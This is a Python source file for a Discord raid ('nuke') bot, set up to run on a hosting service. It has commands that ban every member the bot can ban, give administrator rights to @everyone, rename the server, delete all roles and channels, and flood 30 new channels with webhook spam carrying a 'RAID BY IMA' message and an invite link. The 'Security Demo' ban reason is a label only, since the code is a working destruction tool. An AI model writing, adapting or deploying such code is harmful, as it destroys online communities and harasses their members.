import discord
from discord.ext import commands
import asyncio
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# --- Koyeb用ヘルスチェックサーバー ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running")

def run_health_check():
    server = HTTPServer(('0.0.0.0', int(os.getenv("PORT", 8080))), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_health_check, daemon=True).start()

# --- Botの本体 ---
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'[SYSTEM] ログイン: {bot.user.name}')

@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    print(f"[!] ALLBAN開始")
    tasks = []
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member.top_role < ctx.guild.me.top_role:
            tasks.append(member.ban(reason="Security Demo"))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def admin(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
        print("[!] @everyoneに管理者権限を付与しました")
    except Exception as e:
        print(f"[ERROR] {e}")

@bot.command()
async def ima(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    # サーバー名変更
    await guild.edit(name="いまわーるど支配下")

    # ロール全削除 & 作成
    for role in guild.roles:
        if not role.managed and role.name != "@everyone":
            try: await role.delete()
            except: pass
    for _ in range(30):
        asyncio.create_task(guild.create_role(name="いまさいつお", color=discord.Color.red()))

    # チャンネル全削除 & 作成
    channels = await guild.fetch_channels()
    for channel in channels:
        try: await channel.delete()
        except: pass

    spam_text = "# RAID BY IMA\n## このサーバーは絶対神ima様によってポアされました\n\n## いま最強\n\n@everyone\nhttps://discord.gg/esW7waKaxv"

    for _ in range(30):
        try:
            new_ch = await guild.create_text_channel(name="いまさまの支配下")
            # Webhook作成とスパム
            webhook = await new_ch.create_webhook(name="効いててくかwww")
            for _ in range(50):
                asyncio.create_task(webhook.send(spam_text))
        except: pass

bot.run(os.getenv("DISCORD_TOKEN"))
